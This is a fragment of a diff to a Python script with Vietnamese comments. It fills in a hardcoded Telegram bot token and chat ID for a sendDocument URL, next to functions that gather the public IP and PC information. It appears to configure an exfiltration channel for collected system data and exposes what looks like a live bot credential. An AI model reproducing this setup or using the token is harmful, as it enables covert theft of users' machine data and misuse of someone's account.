@@ -32,8 +32,8 @@ def get_public_ip():
         return f"Lỗi: {e}"
 
 # Thông tin Telegram Bot
-TOKEN = "####################"
-CHAT_ID = "############"
+TOKEN = "7697564639:AAGf7Fx8q8FZKCuUT4GjsIXUwOQESOO7M9g"
+CHAT_ID = "7697564639"
 TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 
 def get_pc_info():
